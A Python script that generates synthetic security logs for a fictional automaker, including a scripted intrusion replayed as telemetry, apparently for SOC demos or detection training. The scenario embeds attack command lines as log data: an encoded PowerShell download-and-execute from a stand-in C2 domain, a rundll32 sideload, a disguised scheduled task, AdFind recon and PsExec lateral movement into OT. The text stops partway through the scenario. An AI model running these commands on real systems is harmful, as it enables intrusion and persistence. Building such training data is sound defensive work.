#!/usr/bin/env python3
"""Fake security telemetry for a fictional automaker (Halvorsen Motors).

Ships OTLP/HTTP JSON logs to Grafana Cloud. Background noise from eleven
sources plus a scripted intrusion that replays every SCENARIO_PERIOD_MIN,
anchored to wall-clock so backfill and live data line up.

Env: GC_OTLP_URL, GC_OTLP_ACCOUNT, GC_OTLP_KEY (read from --env-file).
"""
import argparse
import base64
import hashlib
import json
import math
import os
import random
import sys
import time
import urllib.request

NS = "halvorsen-soc"
DOMAIN = "halvorsen-motors.example"

SITES = {
    "northgate-tech-center": {"code": "NTC", "net": "10.20", "tz_country": "US", "city": "Northgate"},
    "riverside-assembly": {"code": "RVA", "net": "10.10", "tz_country": "US", "city": "Riverside"},
    "cedar-hollow": {"code": "CDH", "net": "10.30", "tz_country": "US", "city": "Cedar Hollow"},
    "monterra": {"code": "MTR", "net": "10.40", "tz_country": "MX", "city": "Monterra"},
    "harbor-point": {"code": "HBP", "net": "10.50", "tz_country": "US", "city": "Harbor Point"},
}
DATACENTER = "dc-prairie-ridge"

DEPTS = [
    ("powertrain-engineering", "northgate-tech-center"),
    ("ev-battery-engineering", "northgate-tech-center"),
    ("body-engineering", "northgate-tech-center"),
    ("connected-vehicle", "northgate-tech-center"),
    ("manufacturing-ops", "riverside-assembly"),
    ("controls-engineering", "riverside-assembly"),
    ("manufacturing-ops", "cedar-hollow"),
    ("quality", "monterra"),
    ("manufacturing-ops", "monterra"),
    ("supply-chain", "harbor-point"),
    ("finance", "northgate-tech-center"),
    ("it", "northgate-tech-center"),
    ("sales", "northgate-tech-center"),
]

FIRST = ["james", "maria", "wei", "aisha", "carlos", "emily", "raj", "olga", "tom", "lucia", "kenji", "fatima",
         "david", "sofia", "ahmed", "grace", "luis", "anna", "mike", "priya", "jorge", "hannah", "omar", "laura",
         "ben", "chen", "diana", "ivan", "nina", "pablo", "sara", "tyler", "yuki", "zoe", "marcus", "elena"]
LAST = ["smith", "garcia", "nguyen", "patel", "kowalski", "johnson", "martinez", "kim", "brown", "lopez",
        "mueller", "tanaka", "wilson", "hernandez", "singh", "anderson", "rossi", "ortega", "chen", "novak",
        "davis", "ramirez", "clark", "khan", "lewis", "torres", "walker", "young", "hall", "allen"]

DCS = [("DC01", "10.1.0.11"), ("DC02", "10.1.0.12"), ("DC03", "10.1.0.13"), ("DC04", "10.1.0.14")]
SERVERS = {
    "MES-RVA-01": ("10.10.5.21", "riverside-assembly"),
    "HIST-RVA-01": ("10.10.5.22", "riverside-assembly"),
    "PLM-NTC-01": ("10.1.0.41", DATACENTER),
    "FS-NTC-CAD": ("10.1.0.52", DATACENTER),
    "SAP-PRD-01": ("10.1.0.61", DATACENTER),
    "JMP-OT-RVA-01": ("172.16.10.5", "riverside-assembly"),
    "EWS-RVA-PAINT-02": ("172.16.12.20", "riverside-assembly"),
    "EWS-RVA-BODY-01": ("172.16.11.20", "riverside-assembly"),
    "EWS-CDH-GA-01": ("172.17.11.20", "cedar-hollow"),
    "HMI-PAINT-L2-01": ("172.16.12.30", "riverside-assembly"),
}
LOGON_TARGETS = ["FS-NTC-CAD", "PLM-NTC-01", "SAP-PRD-01", "MES-RVA-01"]
API_CLIENTS = ["mobile-app-ios", "mobile-app-android", "dealer-portal", "fleet-partner-03", "fleet-partner-07", "insurer-ubi-02"]
CLIENT_IPS = {c: [f"198.18.{10 + i}.{j}" for j in range(11, 17)] for i, c in enumerate(API_CLIENTS)}
SPNS = ["MSSQLSvc/sql-mes-rva.halvorsen-motors.example:1433", "HTTP/plm-ntc-01.halvorsen-motors.example",
        "MSSQLSvc/sql-sap-prd.halvorsen-motors.example:1433", "HTTP/sharepoint.halvorsen-motors.example",
        "CIFS/fs-ntc-cad.halvorsen-motors.example", "HTTP/historian-rva.halvorsen-motors.example",
        "MSSQLSvc/sql-qms-mtr.halvorsen-motors.example:1433", "HTTP/jira.halvorsen-motors.example",
        "HTTP/teamcenter.halvorsen-motors.example", "exchangeAB/mail01.halvorsen-motors.example",
        "MSSQLSvc/sql-telematics.halvorsen-motors.example:1433", "HTTP/vault.halvorsen-motors.example",
        "HTTP/mes-api.halvorsen-motors.example", "ldap/dc01.halvorsen-motors.example", "HTTP/wsus.halvorsen-motors.example"]
SVC_ACCOUNTS = ["svc_mes_backup", "svc_plm_sync", "svc_sql_mes", "svc_sap_batch", "svc_wsus", "svc_scan"]

APPS = ["Microsoft 365", "Workday", "SAP Fiori", "Teamcenter PLM", "ServiceNow", "Concur", "Jira",
        "Salesforce", "GlobalProtect VPN", "Supplier Portal"]
UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/128.0",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) Mobile/15E148",
       "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0)"]

BENIGN_PROCS = [
    ("explorer.exe", "outlook.exe", "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\""),
    ("explorer.exe", "chrome.exe", "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""),
    ("explorer.exe", "excel.exe", "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" /dde"),
    ("explorer.exe", "teams.exe", "\"C:\\Users\\{u}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\""),
    ("services.exe", "svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p"),
    ("explorer.exe", "catia.exe", "\"C:\\Program Files\\Dassault Systemes\\B33\\win_b64\\code\\bin\\CNEXT.exe\""),
    ("explorer.exe", "nx.exe", "\"C:\\Program Files\\Siemens\\NX2312\\NXBIN\\ugraf.exe\""),
    ("ccmexec.exe", "msiexec.exe", "msiexec.exe /i \"C:\\Windows\\ccmcache\\1f\\ZoomInstallerFull.msi\" /qn"),
    ("explorer.exe", "powershell.exe", "powershell.exe -File \\\\fs-ntc-cad\\scripts\\map-drives.ps1"),
    ("svchost.exe", "TiWorker.exe", "C:\\Windows\\winsxs\\amd64\\TiWorker.exe -Embedding"),
]
BENIGN_DOMAINS = [("login.microsoftonline.com", "saas"), ("outlook.office365.com", "saas"),
                  ("halvorsen.service-now.com", "saas"), ("halvorsen.my.salesforce.com", "saas"),
                  ("update.microsoft.com", "software-update"), ("www.google.com", "search"),
                  ("github.com", "development"), ("www.sae.org", "reference"), ("www.linkedin.com", "social"),
                  ("supplier.boschconnect.example", "business"), ("teams.microsoft.com", "saas"),
                  ("cdn.dassault.example", "software-update"), ("weather.com", "news")]

OT_LINES = {
    "riverside-assembly": [("BODY-L1", "172.16.11"), ("PAINT-L2", "172.16.12"), ("GA-L3", "172.16.13")],
    "cedar-hollow": [("GA-L1", "172.17.11"), ("BATT-L2", "172.17.12")],
    "monterra": [("STAMP-L1", "172.18.11")],
}
OT_VENDORS = [("Siemens", "S7-1500", "S7comm"), ("Rockwell", "ControlLogix 5580", "CIP"),
              ("Fanuc", "R-30iB Robot", "Ethernet/IP"), ("Schneider", "Modicon M580", "Modbus/TCP")]

ATTACK_EMAIL_DOMAIN = "haIvorsen-suppliers.example"   # capital I, not l
C2_DOMAIN = "cdn-telemetry-sync.com"
C2_IP = "203.0.113.77"
SPRAY_IPS = ["198.51.100.23", "198.51.100.41", "198.51.100.88", "198.51.100.140", "198.51.100.201"]
ATTACKER_LOGIN_IP = "203.0.113.150"
TELEMATICS_ABUSE_IP = "203.0.113.199"
VICTIMS = ["jakub.kowalski", "aisha.nguyen", "carlos.ortega"]

SEV_NUM = {"DEBUG": 5, "INFO": 9, "WARN": 13, "ERROR": 17, "FATAL": 21}


def build_directory():
    r = random.Random(42)
    users = {}
    for first in FIRST:
        for last in r.sample(LAST, 5):
            dept, site = r.choice(DEPTS)
            u = f"{first}.{last}"
            users[u] = {"user": u, "dept": dept, "site": site}
    users["jakub.kowalski"] = {"user": "jakub.kowalski", "dept": "powertrain-engineering", "site": "northgate-tech-center"}
    users["aisha.nguyen"] = {"user": "aisha.nguyen", "dept": "ev-battery-engineering", "site": "northgate-tech-center"}
    users["carlos.ortega"] = {"user": "carlos.ortega", "dept": "controls-engineering", "site": "riverside-assembly"}
    for i, (u, info) in enumerate(sorted(users.items())):
        code = SITES[info["site"]]["code"]
        net = SITES[info["site"]]["net"]
        info["host"] = f"WKS-{code}-{1000 + i:04d}"
        info["ip"] = f"{net}.{20 + i // 250}.{i % 250 + 2}"
        info["badge"] = f"B{70000 + i}"
        info["mac"] = "00:1a:%02x:%02x:%02x:%02x" % (r.randrange(256), r.randrange(256), r.randrange(256), r.randrange(256))
    return users


USERS = build_directory()
USER_LIST = sorted(USERS)


def sha(s):
    return hashlib.sha256(s.encode()).hexdigest()


def home_ip(r):
    return f"198.18.{r.randrange(256)}.{r.randrange(1, 255)}"


class Gen:
    def __init__(self, seed=None):
        self.r = random.Random(seed)

    # each returns (service, severity, body)
    def idp(self, ts):
        r = self.r
        u = USERS[r.choice(USER_LIST)]
        site = SITES[u["site"]]
        remote = r.random() < 0.35
        fail = r.random() < 0.06
        ev = r.choice(["user.authentication.sso"] * 6 + ["user.mfa.push"] * 2 + ["user.session.start"])
        body = {
            "event_type": ev, "user": u["user"], "dept": u["dept"], "app": r.choice(APPS),
            "src_ip": home_ip(r) if remote else u["ip"],
            "src_country": (site["tz_country"] if r.random() < 0.97 else r.choice(["CA", "DE", "KR", "IN"])),
            "src_city": "" if remote else site["city"], "site": u["site"],
            "outcome": "FAILURE" if fail else "SUCCESS",
            "reason": r.choice(["INVALID_CREDENTIALS", "MFA_TIMEOUT"]) if fail else "",
            "mfa_factor": r.choice(["okta_verify_push", "fido2", "okta_verify_totp"]),
            "risk_level": "LOW" if not fail else "MEDIUM", "user_agent": r.choice(UAS),
        }
        return "secdemo-idp", "WARN" if fail else "INFO", body

    def ad(self, ts):
        r = self.r
        u = USERS[r.choice(USER_LIST)]
        dc, dcip = r.choice(DCS)
        roll = r.random()
        if roll < 0.55:
            lt = r.choice([2, 3, 3, 3, 10, 11])
            dst = u["host"] if lt in (2, 11) else r.choice(LOGON_TARGETS)
            body = {"event_id": 4624, "event_name": "An account was successfully logged on", "logon_type": lt,
                    "user": u["user"], "src_host": u["host"], "src_ip": u["ip"], "dst_host": dst}
            sev = "INFO"
        elif roll < 0.62:
            body = {"event_id": 4625, "event_name": "An account failed to log on", "logon_type": 3,
                    "user": u["user"], "src_host": u["host"], "src_ip": u["ip"], "failure_reason": "0xC000006A"}
            sev = "WARN"
        elif roll < 0.82:
            body = {"event_id": 4768, "event_name": "A Kerberos authentication ticket (TGT) was requested",
                    "user": u["user"], "src_ip": u["ip"], "ticket_encryption": "0x12"}
            sev = "INFO"
        elif roll < 0.97:
            body = {"event_id": 4769, "event_name": "A Kerberos service ticket was requested", "user": u["user"],
                    "src_ip": u["ip"], "src_host": u["host"], "spn": r.choice(SPNS), "ticket_encryption": "0x12"}
            sev = "INFO"
        elif roll < 0.985:
            svc = r.choice(SVC_ACCOUNTS)
            body = {"event_id": 4672, "event_name": "Special privileges assigned to new logon", "user": svc,
                    "src_host": r.choice(LOGON_TARGETS), "privileges": "SeBackupPrivilege SeRestorePrivilege"}
            sev = "INFO"
        else:
            body = {"event_id": 4648, "event_name": "A logon was attempted using explicit credentials",
                    "user": u["user"], "target_user": "adm-" + u["user"].split(".")[0], "src_host": u["host"],
                    "src_ip": u["ip"], "dst_host": r.choice(LOGON_TARGETS), "process": "runas.exe"}
            sev = "INFO"
        body.update({"dc": dc, "dc_ip": dcip, "domain": "HALVORSEN", "site": DATACENTER})
        return "secdemo-ad", sev, body

    def edr(self, ts):
        r = self.r
        u = USERS[r.choice(USER_LIST)]
        parent, proc, cmd = r.choice(BENIGN_PROCS)
        if r.random() < 0.03:
            rva = r.choice([
                ("PUP: Adware bundler", "low", "Initial Access", "T1189", "Drive-by Compromise", "blocked"),
                ("Suspicious script from user Downloads", "medium", "Execution", "T1059.001", "PowerShell", "allowed"),
                ("Known-bad hash: commodity infostealer", "high", "Credential Access", "T1555.003", "Credentials from Web Browsers", "quarantined"),
            ])
            body = {"event_type": "Detection", "detection_name": rva[0], "severity": rva[1], "tactic": rva[2],
                    "technique_id": rva[3], "technique": rva[4], "action": rva[5]}
            sev = "WARN" if rva[1] in ("low", "medium") else "ERROR"
        else:
            body = {"event_type": "ProcessRollup", "severity": "informational", "action": "allowed"}
            sev = "INFO"
        body.update({"host": u["host"], "host_ip": u["ip"], "user": u["user"], "site": u["site"],
                     "process": proc, "parent_process": parent, "cmdline": cmd.replace("{u}", u["user"]),
                     "sha256": sha(proc + cmd)})
        return "secdemo-edr", sev, body

    def firewall(self, ts):
        r = self.r
        u = USERS[r.choice(USER_LIST)]
        roll = r.random()
        if roll < 0.7:
            dom, cat = r.choice(BENIGN_DOMAINS)
            body = {"src_ip": u["ip"], "src_host": u["host"], "src_zone": "corp", "dst_zone": "internet",
                    "dst_ip": f"192.0.2.{r.randrange(1, 255)}", "dst_port": 443, "proto": "tcp", "app": "ssl",
                    "dst_domain": dom, "action": "allow", "rule": "corp-to-internet-web"}
        elif roll < 0.85:
            dc, dcip = r.choice(DCS)
            body = {"src_ip": u["ip"], "src_host": u["host"], "src_zone": "corp", "dst_zone": "datacenter",
                    "dst_ip": dcip, "dst_host": dc, "dst_port": r.choice([88, 389, 445, 53, 135]), "proto": "tcp",
                    "app": r.choice(["kerberos", "ldap", "ms-ds-smb", "dns", "msrpc"]), "action": "allow",
                    "rule": "corp-to-dc-core"}
        elif roll < 0.93:
            site = r.choice(list(OT_LINES))
            line, net = r.choice(OT_LINES[site])
            body = {"src_ip": SERVERS["HIST-RVA-01"][0], "src_host": "HIST-RVA-01", "src_zone": "ot-dmz",
                    "dst_zone": "ot-cell", "dst_ip": f"{net}.{r.randrange(30, 90)}", "dst_port": r.choice([102, 44818, 502]),
                    "proto": "tcp", "app": r.choice(["s7comm", "cip", "modbus"]), "action": "allow",
                    "rule": "historian-poll-ot", "ot_line": line}
        else:
            body = {"src_ip": f"198.18.{r.randrange(256)}.{r.randrange(1, 255)}", "src_zone": "internet",
                    "dst_zone": "dmz", "dst_ip": "192.0.2.10", "dst_port": r.choice([22, 23, 3389, 445, 8080]),
                    "proto": "tcp", "app": "incomplete", "action": "deny", "rule": "default-deny-inbound"}
        body.update({"bytes": r.randrange(400, 90000), "fw": "pa-" + SITES[u["site"]]["code"].lower() + "-edge01",
                     "site": u["site"]})
        return "secdemo-firewall", "WARN" if body["action"] == "deny" else "INFO", body

    def dns(self, ts):
        r = self.r
        u = USERS[r.choice(USER_LIST)]
        dom, cat = r.choice(BENIGN_DOMAINS)
        nx = r.random() < 0.03
        body = {"client_ip": u["ip"], "host": u["host"], "query": ("wpad." + DOMAIN) if nx else dom,
                "qtype": r.choice(["A", "A", "AAAA", "HTTPS"]), "rcode": "NXDOMAIN" if nx else "NOERROR",
                "category": "internal" if nx else cat, "domain_age_days": r.randrange(900, 9000), "site": u["site"]}
        return "secdemo-dns", "INFO", body

    def proxy(self, ts):
        r = self.r
        u = USERS[r.choice(USER_LIST)]
        dom, cat = r.choice(BENIGN_DOMAINS + [("halvorsen.sharepoint.com", "saas"), ("drive.google.com", "file-sharing")])
        blocked = r.random() < 0.02
        body = {"user": u["user"], "host": u["host"], "src_ip": u["ip"], "url_domain": dom, "category": cat,
                "method": r.choice(["GET"] * 8 + ["POST"] * 2), "bytes_out": r.randrange(300, 40000),
                "bytes_in": r.randrange(2000, 900000), "status": 403 if blocked else 200,
                "action": "block" if blocked else "allow", "site": u["site"]}
        return "secdemo-proxy", "WARN" if blocked else "INFO", body

    def vpn(self, ts):
        r = self.r
        u = USERS[r.choice(USER_LIST)]
        ev = r.choice(["connect", "disconnect"])
        body = {"event": ev, "user": u["user"], "src_ip": home_ip(r),
                "src_country": SITES[u["site"]]["tz_country"], "assigned_ip": f"10.200.{r.randrange(256)}.{r.randrange(2, 254)}",
                "gateway": r.choice(["gp-us-east", "gp-us-central", "gp-mx"]), "outcome": "success",
                "client_version": r.choice(["6.2.4", "6.2.4", "6.1.3"]), "hip_compliant": r.random() > 0.02}
        if ev == "disconnect":
            body["duration_s"] = r.randrange(600, 36000)
        return "secdemo-vpn", "INFO", body

    def email(self, ts):
        r = self.r
        u = USERS[r.choice(USER_LIST)]
        spam = r.random() < 0.15
        body = {"sender": r.choice(["noreply@workday.example", "orders@supplier-acme.example", "news@sae.example",
                                    "it-helpdesk@" + DOMAIN, "promo@deals.example"]),
                "recipient": f"{u['user']}@{DOMAIN}", "subject": r.choice(["Weekly status", "PO confirmation",
                                                                          "Your timesheet", "Webinar invite", "Shipment ASN"]),
                "attachment": r.choice(["", "", "", "ASN_88213.pdf", "invoice.pdf"]),
                "verdict": "quarantined" if spam else "delivered", "spam_score": round(r.uniform(5, 9) if spam else r.uniform(0, 3), 1),
                "url_count": r.randrange(0, 4)}
        body["sender_domain"] = body["sender"].split("@")[1]
        return "secdemo-email", "INFO", body

    def ot(self, ts):
        r = self.r
        site = r.choice(list(OT_LINES))
        line, net = r.choice(OT_LINES[site])
        vendor, model, proto = r.choice(OT_VENDORS)
        hour = time.gmtime(ts).tm_hour
        in_window = hour in (6, 7, 18)  # 01-03 / 13 local
        ev = r.choice(["baseline_deviation", "baseline_deviation", "program_upload", "new_asset", "program_download"])
        sev = "low"
        if ev == "program_download":
            in_window = True
            sev = "low"
        body = {"event_type": ev, "site": site, "ot_line": line, "asset": f"PLC-{line}-{r.randrange(1, 12):02d}",
                "asset_ip": f"{net}.{r.randrange(30, 90)}", "vendor": vendor, "model": model, "protocol": proto,
                "src_host": f"EWS-{SITES[site]['code']}-{line.split('-')[0]}-01", "src_ip": f"{net}.20",
                "severity": sev, "change_window": in_window, "change_ticket": f"CHG{r.randrange(100000, 199999)}" if in_window else "",
                "description": {"baseline_deviation": "New polling pattern from known historian",
                                "program_upload": "Controller program read by engineering workstation",
                                "new_asset": "New asset observed (vendor laptop, known OUI)",
                                "program_download": "Approved program download during change window"}[ev]}
        return "secdemo-ot", "INFO", body

    def badge(self, ts):
        r = self.r
        u = USERS[r.choice(USER_LIST)]
        denied = r.random() < 0.03
        body = {"user": u["user"], "badge_id": u["badge"], "site": u["site"],
                "door": r.choice(["Main Lobby", "Lab 3 East", "Data Hall", "Paint Shop Gate", "Cafeteria", "Garage B"]),
                "outcome": "denied" if denied else "granted", "reader": f"rdr-{r.randrange(1, 80):03d}"}
        return "secdemo-badge", "WARN" if denied else "INFO", body

    def telematics(self, ts):
        r = self.r
        client = r.choice(API_CLIENTS)
        ep = r.choice(["/v2/vehicles/{vin}/status", "/v2/vehicles/{vin}/location", "/v2/vehicles/{vin}/charge",
                       "/v2/vehicles/{vin}/remote/lock", "/v2/ota/campaigns"])
        vin = "5HV" + "".join(r.choice("ABCDEFGHJKLMNPRSTUVWXYZ0123456789") for _ in range(14))
        st = r.choice([200] * 40 + [401, 404, 429, 500])
        body = {"client_id": client, "api_key_id": "ak_" + client.replace("-", ""), "method": "POST" if "remote" in ep else "GET",
                "endpoint": ep, "vin": vin, "status": st, "latency_ms": int(r.lognormvariate(4.2, 0.5)),
                "src_ip": r.choice(CLIENT_IPS[client]), "gateway": "apigw-telematics-us"}
        return "secdemo-telematics", "WARN" if st >= 400 else "INFO", body


RATES = {"idp": 1.2, "ad": 1.5, "edr": 2.0, "firewall": 3.0, "dns": 1.5, "proxy": 1.0, "vpn": 0.2,
         "email": 0.4, "ot": 0.15, "badge": 0.5, "telematics": 1.5}


def scenario(cycle_start, cycle_idx):
    """Scripted intrusion; returns list of (ts, service, severity, body)."""
    r = random.Random(cycle_idx)
    v = USERS[VICTIMS[cycle_idx % len(VICTIMS)]]
    vh, vip = v["host"], v["ip"]
    out = []
    lure = f"PO_Revision_{r.randrange(40000, 49999)}.xlsm"

    def at(minute, svc, sev, body):
        out.append((cycle_start + minute * 60 + r.uniform(0, 20), svc, sev, body))

    # 0: phishing wave
    recips = r.sample(USER_LIST, 30) + [v["user"]]
    for i, u in enumerate(recips):
        delivered = (u == v["user"]) or r.random() < 0.3
        at(0 + i * 0.02, "secdemo-email", "WARN", {
            "sender": f"accounts-payable@{ATTACK_EMAIL_DOMAIN}", "sender_domain": ATTACK_EMAIL_DOMAIN,
            "recipient": f"{u}@{DOMAIN}", "subject": "URGENT: revised tooling PO - action required",
            "attachment": lure, "verdict": "delivered" if delivered else "quarantined",
            "spam_score": round(r.uniform(3.1, 4.9), 1), "url_count": 1, "domain_age_days": 3,
            "dmarc": "fail"})
    # 2: macro -> powershell
    at(2, "secdemo-edr", "ERROR", {
        "event_type": "Detection", "detection_name": "Office application spawned encoded PowerShell",
        "severity": "high", "tactic": "Execution", "technique_id": "T1059.001", "technique": "PowerShell",
        "action": "allowed", "host": vh, "host_ip": vip, "user": v["user"], "site": v["site"],
        "process": "powershell.exe", "parent_process": "excel.exe",
        "cmdline": "powershell.exe -nop -w hidden -enc " + base64.b64encode(
            f"IEX (New-Object Net.WebClient).DownloadString('https://{C2_DOMAIN}/s')".encode("utf-16le")).decode()[:120],
        "sha256": sha("ps-stager"), "file_name": lure})
    at(2.1, "secdemo-dns", "WARN", {"client_ip": vip, "host": vh, "query": C2_DOMAIN, "qtype": "A", "rcode": "NOERROR",
                                     "category": "newly-registered", "domain_age_days": 4, "site": v["site"]})
    # 4: dll sideload + persistence
    at(4, "secdemo-edr", "ERROR", {
        "event_type": "Detection", "detection_name": "Rundll32 executing DLL from user temp", "severity": "high",
        "tactic": "Defense Evasion", "technique_id": "T1218.011", "technique": "Rundll32", "action": "allowed",
        "host": vh, "host_ip": vip, "user": v["user"], "site": v["site"], "process": "rundll32.exe",
        "parent_process": "powershell.exe",
        "cmdline": f"rundll32.exe C:\\Users\\{v['user']}\\AppData\\Local\\Temp\\msupd.dll,DllRegisterServer",
        "sha256": sha("msupd.dll")})
    at(4.5, "secdemo-edr", "WARN", {
        "event_type": "Detection", "detection_name": "Scheduled task created by script host", "severity": "medium",
        "tactic": "Persistence", "technique_id": "T1053.005", "technique": "Scheduled Task", "action": "allowed",
        "host": vh, "host_ip": vip, "user": v["user"], "site": v["site"], "process": "schtasks.exe",
        "parent_process": "rundll32.exe",
        "cmdline": "schtasks /create /sc minute /mo 30 /tn \"OneDrive Standalone Update Task\" /tr \"rundll32 msupd.dll,DllRegisterServer\"",
        "sha256": sha("schtasks")})
    # beaconing for the rest of the cycle
    for m in range(3, 30):
        jitter = r.uniform(-0.05, 0.05)
        at(m + jitter, "secdemo-firewall", "INFO", {
            "src_ip": vip, "src_host": vh, "src_zone": "corp", "dst_zone": "internet", "dst_ip": C2_IP,
            "dst_domain": C2_DOMAIN, "dst_port": 443, "proto": "tcp", "app": "ssl", "action": "allow",
            "rule": "corp-to-internet-web", "bytes": 1200 + r.randrange(0, 300),
            "fw": "pa-" + SITES[v["site"]]["code"].lower() + "-edge01", "site": v["site"]})
    # 6: password spray + MFA fatigue
    for i in range(70):
        u = r.choice(USER_LIST)
        at(6 + i * 0.05, "secdemo-idp", "WARN", {
            "event_type": "user.authentication.sso", "user": u, "dept": USERS[u]["dept"], "app": "Microsoft 365",
            "src_ip": r.choice(SPRAY_IPS), "src_country": r.choice(["NL", "RO", "BG"]), "src_city": "",
            "site": USERS[u]["site"], "outcome": "FAILURE", "reason": "INVALID_CREDENTIALS",
            "mfa_factor": "", "risk_level": "HIGH", "user_agent": "python-requests/2.31.0"})
    at(7.3, "secdemo-idp", "WARN", {
        "event_type": "user.authentication.sso", "user": v["user"], "dept": v["dept"], "app": "Microsoft 365",
        "src_ip": SPRAY_IPS[2], "src_country": "RO", "src_city": "", "site": v["site"], "outcome": "SUCCESS",
        "reason": "PASSWORD_OK_MFA_REQUIRED", "mfa_factor": "", "risk_level": "HIGH", "user_agent": "python-requests/2.31.0"})
    for i in range(8):
        last = i == 7
        at(7.5 + i * 0.25, "secdemo-idp", "WARN" if not last else "ERROR", {
            "event_type": "user.mfa.push", "user": v["user"], "dept": v["dept"], "app": "GlobalProtect VPN",
            "src_ip": ATTACKER_LOGIN_IP, "src_country": "RO", "src_city": "Bucharest", "site": v["site"],
            "outcome": "SUCCESS" if last else "FAILURE", "reason": "" if last else r.choice(["MFA_DENIED", "MFA_TIMEOUT"]),
            "mfa_factor": "okta_verify_push", "risk_level": "HIGH", "user_agent": UAS[0]})
    # 8: badge in Northgate while...
    at(8, "secdemo-badge", "INFO", {"user": v["user"], "badge_id": v["badge"], "site": v["site"], "door": "Lab 3 East",
                                    "outcome": "granted", "reader": "rdr-017"})
    # 9: ...VPN from Romania
    vpn_ip = f"10.200.66.{r.randrange(10, 250)}"
    at(9.6, "secdemo-vpn", "WARN", {"event": "connect", "user": v["user"], "src_ip": ATTACKER_LOGIN_IP, "src_country": "RO",
                                    "assigned_ip": vpn_ip, "gateway": "gp-us-east", "outcome": "success",
                                    "client_version": "5.2.1", "hip_compliant": False})
    # 10: kerberoast + AD recon
    for i, spn in enumerate(SPNS):
        at(10 + i * 0.03, "secdemo-ad", "WARN", {
            "event_id": 4769, "event_name": "A Kerberos service ticket was requested", "user": v["user"],
            "src_ip": vip, "src_host": vh, "spn": spn, "ticket_encryption": "0x17", "dc": "DC02", "dc_ip": "10.1.0.12",
            "domain": "HALVORSEN", "site": DATACENTER})
    at(10.5, "secdemo-edr", "ERROR", {
        "event_type": "Detection", "detection_name": "AD reconnaissance tool (AdFind) executed", "severity": "high",
        "tactic": "Discovery", "technique_id": "T1087.002", "technique": "Domain Account", "action": "allowed",
        "host": vh, "host_ip": vip, "user": v["user"], "site": v["site"], "process": "adfind.exe",
        "parent_process": "rundll32.exe", "cmdline": "adfind.exe -f (servicePrincipalName=*) -csv name servicePrincipalName",
        "sha256": sha("adfind")})
    # 13: service account abuse + group add
    at(12.8, "secdemo-ad", "WARN", {"event_id": 4648, "event_name": "A logon was attempted using explicit credentials",
                                    "user": v["user"], "target_user": "svc_mes_backup", "src_host": vh, "src_ip": vip,
                                    "dst_host": "MES-RVA-01", "process": "rundll32.exe",
                                    "dc": "DC02", "dc_ip": "10.1.0.12", "domain": "HALVORSEN", "site": DATACENTER})
    at(13, "secdemo-ad", "WARN", {"event_id": 4624, "event_name": "An account was successfully logged on", "logon_type": 3,
                                  "user": "svc_mes_backup", "src_host": vh, "src_ip": vip, "dst_host": "MES-RVA-01",
                                  "dc": "DC02", "dc_ip": "10.1.0.12", "domain": "HALVORSEN", "site": DATACENTER})
    at(13.1, "secdemo-ad", "WARN", {"event_id": 4672, "event_name": "Special privileges assigned to new logon",
                                    "user": "svc_mes_backup", "src_host": vh, "privileges": "SeDebugPrivilege SeBackupPrivilege",
                                    "dc": "DC02", "dc_ip": "10.1.0.12", "domain": "HALVORSEN", "site": DATACENTER})
    at(13.4, "secdemo-ad", "ERROR", {"event_id": 4732, "event_name": "A member was added to a security-enabled local group",
                                     "user": "svc_mes_backup", "target_user": v["user"], "group": "GRP-OT-Engineering-RVA",
                                     "src_host": vh, "src_ip": vip, "dc": "DC02", "dc_ip": "10.1.0.12",
                                     "domain": "HALVORSEN", "site": DATACENTER})
    # 15: IT -> OT crossing, OT scan, lsass dump on EWS
    ews, (ews_ip, _) = "EWS-RVA-PAINT-02", SERVERS["EWS-RVA-PAINT-02"]
    at(15, "secdemo-firewall", "WARN", {"src_ip": vpn_ip, "src_host": vh, "src_zone": "vpn", "dst_zone": "ot-dmz",
                                        "dst_ip": SERVERS["JMP-OT-RVA-01"][0], "dst_host": "JMP-OT-RVA-01", "dst_port": 3389,
                                        "proto": "tcp", "app": "ms-rdp", "action": "allow", "rule": "ot-jump-engineering",
                                        "bytes": 840000, "fw": "pa-rva-ot01", "site": "riverside-assembly"})
    at(15.6, "secdemo-firewall", "WARN", {"src_ip": SERVERS["JMP-OT-RVA-01"][0], "src_host": "JMP-OT-RVA-01", "src_zone": "ot-dmz",
                                          "dst_zone": "ot-cell", "dst_ip": ews_ip, "dst_host": ews, "dst_port": 3389,
                                          "proto": "tcp", "app": "ms-rdp", "action": "allow", "rule": "ot-dmz-to-ews",
                                          "bytes": 610000, "fw": "pa-rva-ot01", "site": "riverside-assembly"})
    jmp, jmp_ip = "JMP-OT-RVA-01", SERVERS["JMP-OT-RVA-01"][0]
    ad_common = {"dc": "DC02", "dc_ip": "10.1.0.12", "domain": "HALVORSEN", "site": DATACENTER}
    at(15.1, "secdemo-ad", "WARN", {"event_id": 4624, "event_name": "An account was successfully logged on", "logon_type": 10,
                                    "user": v["user"], "src_host": vh, "src_ip": vpn_ip, "dst_host": jmp, **ad_common})
    at(15.7, "secdemo-ad", "WARN", {"event_id": 4624, "event_name": "An account was successfully logged on", "logon_type": 10,
                                    "user": v["user"], "src_host": jmp, "src_ip": jmp_ip, "dst_host": ews, **ad_common})
    # 17: second hop with stolen OT admin creds, PsExec to the line HMI
    hmi, hmi_ip = "HMI-PAINT-L2-01", SERVERS["HMI-PAINT-L2-01"][0]
    at(17, "secdemo-ad", "WARN", {"event_id": 4648, "event_name": "A logon was attempted using explicit credentials",
                                  "user": v["user"], "target_user": "ot_admin", "src_host": ews, "src_ip": ews_ip,
                                  "dst_host": hmi, "process": "PsExec64.exe", **ad_common})
    at(17.05, "secdemo-firewall", "WARN", {"src_ip": ews_ip, "src_host": ews, "src_zone": "ot-cell", "dst_zone": "ot-cell",
                                           "dst_ip": hmi_ip, "dst_host": hmi, "dst_port": 445, "proto": "tcp",
                                           "app": "ms-ds-smb", "action": "allow", "rule": "ews-admin-hmi", "bytes": 1900000,
                                           "fw": "pa-rva-ot01", "site": "riverside-assembly"})
